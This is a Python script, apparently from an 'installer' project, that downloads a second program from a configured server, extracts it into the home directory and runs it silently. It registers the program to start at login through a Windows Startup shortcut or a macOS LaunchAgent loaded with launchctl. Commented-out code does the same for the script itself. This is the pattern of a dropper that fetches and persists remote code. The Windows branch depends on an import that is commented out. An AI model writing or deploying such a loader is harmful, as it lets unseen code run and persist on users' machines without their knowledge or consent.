import os
# import sys
import subprocess
import urllib.request
import platform
# import atexit
import shutil
# import tempfile
import time
import sys
sys.path.insert(0, '/Users/apple/Desktop/pkg_installer/exe-and-dmg-installer')
from utils.extractzip import extract_zip
from utils.const import SERVERURL ,secondaryprogram
INTERVAL = 10
# import win32com.client
baseurl =SERVERURL 

# def add_to_startup():
#     if platform.system() == "Windows":
#         startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
#         shortcut_path = os.path.join(startup_folder, 'main_programxv.lnk')
#         if not os.path.exists(shortcut_path):
#             create_windows_shortcut(shortcut_path)
#     elif platform.system() == "Darwin":  # macOS
#         plist_path = os.path.expanduser('~/Library/LaunchAgents/com.example.startup.plist')
#         if not os.path.exists(plist_path):
#             create_macos_plist(plist_path)

# def create_windows_shortcut(shortcut_path):
#     import win32com.client
#     shell = win32com.client.Dispatch("WScript.Shell")
#     shortcut = shell.CreateShortCut(shortcut_path)
#     shortcut.TargetPath = sys.executable
#     shortcut.Arguments = f'"{os.path.abspath(__file__)}"'
#     shortcut.WorkingDirectory = os.path.dirname(os.path.abspath(__file__))
#     shortcut.save()

# def create_macos_plist(plist_path):
#     plist_content = f"""
#     <?xml version="1.0" encoding="UTF-8"?>
#     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
#     <plist version="1.0">
#       <dict>
#         <key>Label</key>
#         <string>main_programxv</string>
#         <key>ProgramArguments</key>
#         <array>
#           <string>{sys.executable}</string>
#           <string>{os.path.abspath(__file__)}</string>
#         </array>
#         <key>RunAtLoad</key>
#         <true/>
#         <key>KeepAlive</key>
#         <true/>
#       </dict>
#     </plist>
#     """
#     with open(plist_path, 'w') as plist_file:
#         plist_file.write(plist_content)
#     # os.system(f'launchctl load {plist_path}')

# FIXED_TEMP_DIR = os.path.join(os.path.expanduser("~"), "lzppvvp")
# os.makedirs(FIXED_TEMP_DIR, exist_ok=True)

# def cleanup_temp_dir():
#     try:
#         shutil.rmtree(FIXED_TEMP_DIR)
#         print(f"Temporary directory {FIXED_TEMP_DIR} removed successfully.")
#     except Exception as e:
#         print(f"Failed to remove temporary directory {FIXED_TEMP_DIR}: {e}")

# Register the cleanup function to be called on program exit

PROGRAM_NAME =  secondaryprogram[0]["name"]
def add_to_startup_windows(program_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, f'{PROGRAM_NAME}.lnk')

    # Create a Windows shortcut using pywin32
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = program_path
    shortcut.WorkingDirectory = os.path.dirname(program_path)
    shortcut.save()
    print(f"Shortcut created at {shortcut_path}")

def add_to_startup_mac(program_path):
    print(program_path)
    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>secondary_programxv</string>
        <key>ProgramArguments</key>
        <array>

            <string>{program_path}/Contents/MacOS/{PROGRAM_NAME}</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
   
    </dict>
    </plist>"""

    plist_path = os.path.expanduser('~/Library/LaunchAgents/com.secondaryprogram.plist')
    with open(plist_path, 'w') as plist_file:
        plist_file.write(plist_content)

    # Load the plist file
    subprocess.run(['launchctl', 'unload', plist_path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['launchctl', 'load', plist_path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # subprocess.run(['launchctl', 'start', plist_path])
    # launchctl start com.yourdomain.yourapp

    print(f"LaunchAgent created at {plist_path}")

def download_secondary_program():
    download_file = f"{PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{PROGRAM_NAME}.zip"
    dir =os.path.expanduser("~")
    download_path = os.path.join(dir, download_file)
    secondary_program = f"{PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{PROGRAM_NAME}.app"
    url = f"{baseurl}/download/" + download_file
    path = os.path.join(dir, secondary_program)
    while not os.path.exists(path):
        try:
            urllib.request.urlretrieve(url, download_path)
            extract_zip(download_path,dir)

            print(f"Downloaded: {path}")
            break
        except Exception as e:
            print(f"Failed to download {url}: {e}")
            time.sleep(INTERVAL)
    return path

def run_secondary_program(path):
    try:
        if platform.system() == "Windows":
            subprocess.Popen([path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == "Darwin":  # macOS
            subprocess.Popen(["open", path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Running: {path}")
    except Exception as e:
        print(f"Failed to run {path}: {e}")

if __name__ == '__main__':
    # add_to_startup()
    secondary_program_path = download_secondary_program()
    # Configure startup
    if platform.system() == "Windows":
        path = os.path.join(os.path.expanduser("~"), PROGRAM_NAME+".exe")
        add_to_startup_windows(path)
    elif platform.system() == "Darwin":
        path = os.path.join(os.path.expanduser("~"), PROGRAM_NAME+".app")
        add_to_startup_mac(path)
    else:
        print("Unsupported operating system")

    run_secondary_program(secondary_program_path)
# atexit.register(cleanup_temp_dir)